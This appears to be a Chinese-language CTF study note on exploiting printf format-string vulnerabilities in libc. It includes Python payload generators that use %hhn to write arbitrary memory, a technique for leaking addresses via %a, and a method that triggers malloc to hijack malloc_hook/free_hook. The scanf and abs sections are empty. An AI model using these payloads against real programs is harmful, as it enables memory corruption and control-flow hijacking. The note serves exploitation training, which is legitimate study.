
# libc函数漏洞

# printf

著名的**格式化字符串漏洞**就不说啦~ `printf`家族的函数都存在这个漏洞

> printf,  fprintf,  dprintf,  sprintf,  snprintf, vprintf, vfprintf, vdprintf, vsprintf, vsnprintf 

## 常用格式

| 格式符 | 用途                           | 备注                                                         |
| ------ | ------------------------------ | ------------------------------------------------------------ |
| `%p`   | 以指针格式输出栈中变量的地址   | `$`用于指定位置参数，e.g.`%13$p`                             |
| `%s`   | 输出栈中指针指向的字符串       | 若指针不合法则输出`(nil)`                                    |
| `%a`   | 以double格式输出栈中变量       | 常见于`printf_chk`泄漏`libc`，详见[#1](#泄漏内存)            |
| `%c`   | 以char格式输出栈中变量         | 打印过多字符将调用`malloc`，详见[#2](#触发malloc)       |
| `%n`   | 将已输出的字符数保存到栈中指针 | 若指针不合法则报错<br />`%n`-4字节; `%hn`-2字节; `%hhn`-1字节 |

## 泄漏内存

`%p`用于泄漏内存就不多说了

用`%a`的时候要注意一下输出格式的问题，比如有如下输出：

```c
0x0.07fcf47895ap-1022
```

由于是小数的形式打印的，变量末尾的0会被自动省略掉，需要手动还原一下：

```c
0x07fcf4789500
```



## 任意写

### case1: buf足够大

如果buf足够大，可以考虑同时使用多个格式符，一次完成变量的修改。

下面是keer师傅的`%hhn`大法可以快速完成任意写，payload长度至少为`128`

```python
def fmt(data,addr,off):
    arg0=(data)&0xff
    arg1=(data&0xff00)>>8
    arg2=(data&0xff0000)>>16
    arg3=(data&0xff000000)>>24
    arg4=(data&0xff00000000)>>32
    arg5=(data&0xff0000000000)>>40
    print arg0,arg1,arg2,arg3
    # arg6=(data&0xf f000000000000)>>48
    # arg7=(data&0xf f00000000000000)>>56
    pay1='%'+str(arg0)+'c%'+str(off+10)+'$hhn'
    pay2='%'+str( (arg1-arg0+0x100)%0x100)+'c%'+str(off+11)+'$hhn'
    pay3='%'+str( (arg2-arg1+0x100)%0x100)+'c%'+str(off+12)+'$hhn'
    pay4='%'+str( (arg3-arg2+0x100)%0x100)+'c%'+str(off+13)+'$hhn'
    pay5='%'+str( (arg4-arg3+0x100)%0x100)+'c%'+str(off+14)+'$hhn'
    pay6='%'+str( (arg5-arg4+0x100)%0x100)+'c%'+str(off+15)+'$hhn'
    payload = pay1+pay2+pay3+pay4+pay5+pay6 # +'%100000c'
    payload = payload.ljust(8*10,'A')
    payload+= p64(addr)
    payload+= p64(addr+1)
    payload+= p64(addr+2)
    payload+= p64(addr+3)
    payload+= p64(addr+4)
    payload+= p64(addr+5)
    return payload
```

`%hhn`一次写1个字节，相当于是`byte/char`型，最大范围是`0xff`，所以`(arg1-arg0+0x100)%0x100`这样的溢出写法，可以在不排序的情况下准确覆盖变量。

由于每次只改1字节，使用`%hhn`快速完成任意写，不足之处就是payload太长。

### case2: buf不够大

如果buf长度不够，可以考虑重复利用`printf`，多次攻击完成变量的修改。

下面是藕自己写的模板，payload长度最少是`32`字节：

```python
def alter_byte(addr,data):
    if data==0:
        payload = "%10$hhn"
    else:
        payload = "%%%dc%%10$hhn"%(data)
    payload = payload.ljust(24,'T')
    payload += p64(addr)
    sl(payload)
    return rc()

def alter_dw(addr,data):
    alter_byte(addr,data&0xff)
    alter_byte(addr+1,(data>>8)&0xff)
    alter_byte(addr+2,(data>>16)&0xff)
    alter_byte(addr+3,(data>>24)&0xff)

def alter_qw(addr,data):
    alter_dw(addr,data)
    alter_dw(addr+4,data>>32)

```

>其中10是offset，用的时候改一下

## 触发malloc

`%100000c`表示在输出字符时向左侧填充空格，最终输出长度为`100000`的字符串。当字符串长度过大的时候，`printf`内部将调用`malloc`申请空间作为缓冲器，输出结束后会`free`掉这片空间。

利用方式：

* 篡改`malloc_hook`/`free_hook`，使用`%100000c`触发`malloc`/`free`，劫持程序控制流
* 和堆相关利用结合，利用`printf`隐试调用`malloc`

> 此外，从原理上看`%100000s`,`%10000d`等类似格式也可达到同样效果。

## 练习题

* [0CTF-EasiestPrintf](https://poning.me/2017/03/23/EasiestPrintf/)

* [ACTF-fmt64](http://taqini.space/2020/02/13/ACTF2020-writeup/#fmt64)

* [eonew-easy_printf](http://pwn.eonew.cn/) (根据Ex师傅平台的要求就不公开wp了) 
* [ACTF-chk_rop](https://github.com/TaQini/ctf/tree/master/ACTF2020/pwn/unsolved/chk_rop) (printf_chk)

> 更新日期：2020年 04月 01日 星期三 23:05:56  CST

# scanf



# abs


